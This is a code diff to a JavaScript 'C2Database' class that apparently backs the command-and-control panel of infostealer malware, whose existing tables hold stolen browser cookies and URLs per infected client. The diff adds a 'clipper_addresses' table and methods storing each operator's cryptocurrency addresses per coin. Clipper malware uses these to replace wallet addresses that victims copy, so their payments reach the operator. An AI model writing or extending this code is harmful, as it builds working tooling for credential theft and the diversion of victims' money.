@@ -225,6 +225,19 @@ class C2Database {
             CREATE INDEX IF NOT EXISTS idx_cookies_client_browser ON cookies(client_id, browser);
             CREATE INDEX IF NOT EXISTS idx_urls_client_url ON urls(client_id, url);
         `);
+
+        // Clipper addresses — one row per operator user per coin
+        this.db.exec(`
+            CREATE TABLE IF NOT EXISTS clipper_addresses (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id INTEGER NOT NULL,
+                coin TEXT NOT NULL,
+                address TEXT NOT NULL,
+                updated_at INTEGER DEFAULT (strftime('%s', 'now')),
+                UNIQUE(user_id, coin),
+                FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
+            )
+        `);
     }
     
     // Client operations
@@ -768,6 +781,47 @@ class C2Database {
         if (!row) return null;
         this.db.prepare('UPDATE download_tokens SET download_count = download_count + 1 WHERE token = ?').run(token);
         return { userId: row.user_id, customFilename: row.custom_filename || null };
+    }
+
+    // ── Clipper addresses ────────────────────────────────────────────────────
+    // Returns { BTC: 'addr', ETH: 'addr', ... } for a user
+    getClipperAddresses(userId) {
+        const rows = this.db.prepare('SELECT coin, address FROM clipper_addresses WHERE user_id = ?').all(userId);
+        const result = {};
+        for (const row of rows) {
+            if (row.address) result[row.coin] = row.address;
+        }
+        return result;
+    }
+
+    // Upsert a single coin address. Pass null/empty to clear it.
+    setClipperAddress(userId, coin, address) {
+        const clean = typeof address === 'string' ? address.trim() : '';
+        if (!clean) {
+            this.db.prepare('DELETE FROM clipper_addresses WHERE user_id = ? AND coin = ?').run(userId, coin);
+        } else {
+            this.db.prepare(`
+                INSERT INTO clipper_addresses (user_id, coin, address, updated_at)
+                VALUES (?, ?, ?, strftime('%s', 'now'))
+                ON CONFLICT(user_id, coin) DO UPDATE SET address = excluded.address, updated_at = excluded.updated_at
+            `).run(userId, coin, clean);
+        }
+    }
+
+    // Replace all addresses for a user at once from a { coin: addr } map
+    setClipperAddresses(userId, addressMap) {
+        const upsert = this.db.transaction((map) => {
+            this.db.prepare('DELETE FROM clipper_addresses WHERE user_id = ?').run(userId);
+            const stmt = this.db.prepare(`
+                INSERT INTO clipper_addresses (user_id, coin, address)
+                VALUES (?, ?, ?)
+            `);
+            for (const [coin, addr] of Object.entries(map)) {
+                const clean = typeof addr === 'string' ? addr.trim() : '';
+                if (clean) stmt.run(userId, coin, clean);
+            }
+        });
+        upsert(addressMap);
     }
     
     // Client operations with user filtering
